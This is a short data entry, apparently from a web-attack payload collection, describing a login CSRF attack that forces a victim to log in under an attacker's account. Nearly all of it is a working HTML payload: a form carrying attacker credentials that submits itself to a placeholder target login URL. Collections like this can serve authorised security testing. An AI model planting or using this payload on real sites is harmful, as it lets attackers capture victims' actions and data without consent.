login_csrf.description: CSRF on login forms to force-authenticate victim as attacker (session fixation variant)

payloads.description: Force victim to log in as attacker — captures victim actions under attacker account

payloads.payload: <form method="POST" action="TARGET_LOGIN_URL"><input name="email" value="attacker@evil.com"><input name="password" value="secret"><input name="remember" value="1"></form><script>document.forms[0].submit()</script>
